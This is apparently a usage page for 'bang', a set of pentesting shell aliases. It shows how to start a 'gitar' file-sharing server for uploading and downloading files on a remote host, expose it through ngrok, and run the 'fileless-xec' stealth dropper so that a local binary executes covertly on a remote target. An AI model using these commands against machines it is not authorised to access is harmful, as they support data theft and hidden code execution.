# Examples

Some examples of bang usage

## `gitar`

### Share files

Start file sharing:
```
bang.gitar $AA $AP
```
This will start a `gitar` http server and copy to your clipboard a command line to run on remote. Run it, you can now upload and download file from remote easily (without further installations [see](https://github.com/ariary/gitar/blob/main/README.md#tldr---and-listen-music)). 

### Share files safely

Same as above + inside a container + using https for encryption

Start safe file sharing:
```
bang.gitar-safe $AA $AP
```

### Expose local file on internet

`ngrok` enable us to share local port on the internet. The idea is to start `gitar` server locally and then expose the local port on internet using `ngrok`

*Notes: as we use `ngrok` and we do not add certificates we must a use gitar w/o TLS*

1. Start `gitar` server: `bang.gitar 127.0.0.1`
2. Expose the server port on internet: `bang.expose 9237`

Ngrok will output the internet reachable address for your server (use `https` one preferably)

## `fileless-xec`

### Copy line to launch `fieleless-xec` stealth dropper

This will copy command line on your clipboard to launch fileless-xec on remote. (Previously, uploaded it to the remote machine)

```
bang.flxscpy
```

### Send a local file to remote `fileless-xec` to stealthy run it

This will send a local binary to a remote listening `fileless-xec`. The binary will be then executed (stealthy) on remote

```
bang.flxssend [TARGET_IP]] [TARGET_PORT] [binary]
```

